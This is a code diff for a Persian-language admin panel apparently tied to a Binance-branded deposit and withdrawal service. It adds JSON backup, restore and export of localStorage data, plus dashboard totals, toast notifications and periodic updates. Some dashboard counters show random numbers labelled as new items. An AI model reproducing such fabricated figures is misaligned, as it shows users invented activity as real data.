+        function backupDatabase() {
+            const dataStr = JSON.stringify(realDatabase, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = `binance-backup-${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+            
+            showNotification('پشتیبان‌گیری کامل انجام شد 💾');
+        }
+
+        function restoreDatabase() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = '.json';
+            
+            input.onchange = e => {
+                const file = e.target.files[0];
+                const reader = new FileReader();
+                
+                reader.onload = event => {
+                    try {
+                        const backupData = JSON.parse(event.target.result);
+                        realDatabase = backupData;
+                        saveDatabase();
+                        loadAllData();
+                        showNotification('دیتابیس با موفقیت بازیابی شد ✅');
+                    } catch (error) {
+                        showNotification('خطا در بازیابی دیتابیس ❌', 'error');
+                    }
+                };
+                
+                reader.readAsText(file);
+            };
+            
+            input.click();
+        }
+
+        // ========== ابزارک‌ها و توابع کمکی ==========
         function getStatusText(status) {
             const statusMap = {
                 'pending': 'در انتظار',
                 'approved': 'تایید شده',
                 'rejected': 'رد شده',
-                'active': 'فعال'
+                'active': 'فعال',
+                'inactive': 'غیرفعال'
             };
             return statusMap[status] || status;
         }
@@ -948,6 +1595,9 @@
             const pendingDeposits = realDatabase.depositRequests.filter(d => d.status === 'pending').length;
             const pendingWithdrawals = realDatabase.withdrawalRequests.filter(w => w.status === 'pending').length;
             const newTickets = realDatabase.supportTickets.filter(t => t.status === 'open').length;
+            const totalUsers = realDatabase.users.length;
+            const totalBalance = realDatabase.users.reduce((sum, user) => sum + user.balance, 0);
+            const totalPayouts = realDatabase.users.reduce((sum, user) => sum + user.totalProfit, 0);
 
             document.getElementById('depositCount').textContent = pendingDeposits;
             document.getElementById('withdrawalCount').textContent = pendingWithdrawals;
@@ -956,6 +1606,31 @@
             document.getElementById('pendingDepositsCount').textContent = pendingDeposits;
             document.getElementById('pendingWithdrawalsCount').textContent = pendingWithdrawals;
             document.getElementById('newTicketsCount').textContent = newTickets;
+            
+            document.getElementById('totalUsers').textContent = totalUsers;
+            document.getElementById('totalBalance').textContent = `$${totalBalance.toLocaleString()}`;
+            document.getElementById('totalPayouts').textContent = `$${totalPayouts.toLocaleString()}`;
+            
+            // آپدیت تغییرات
+            document.getElementById('depositsChange').textContent = `+${Math.floor(Math.random() * 5)} مورد جدید`;
+            document.getElementById('withdrawalsChange').textContent = `+${Math.floor(Math.random() * 3)} مورد جدید`;
+            document.getElementById('ticketsChange').textContent = `+${Math.floor(Math.random() * 8)} مورد جدید`;
+        }
+
+        function saveDatabase() {
+            localStorage.setItem('binanceAdminData', JSON.stringify(realDatabase));
+        }
+
+        function exportAllData() {
+            const dataStr = JSON.stringify(realDatabase, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = `binance-export-${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+            
+            showNotification('خروجی کامل داده‌ها گرفته شد 📊');
         }
 
         function showModal(modalId) {
@@ -967,7 +1642,34 @@
         }
 
         function showNotification(message, type = 'success') {
-            alert(message); // در حالت واقعی از toast استفاده کنید
+            // ایجاد یک toast ساده
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 20px;
+                background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
+                color: white;
+                padding: 1rem 1.5rem;
+                border-radius: 8px;
+                z-index: 10000;
+                font-weight: 600;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        function startRealTimeUpdates() {
+            setInterval(() => {
+                document.getElementById('lastUpdate').textContent = new Date().toLocaleString('fa-IR');
+                loadRealTimeMonitor();
+                updateCounters();
+            }, 10000); // هر 10 ثانیه آپدیت شود
         }
 
         // ========== مدیریت ناوبری ==========
@@ -986,6 +1688,8 @@
         // بارگذاری اولیه
         document.addEventListener('DOMContentLoaded', function() {
             loadAllData();
+            document.getElementById('connectionStatus').textContent = '🟢 آنلاین - دسترسی کامل';
+            
             setInterval(() => {
                 document.getElementById('lastUpdate').textContent = new Date().toLocaleString('fa-IR');
             }, 60000);
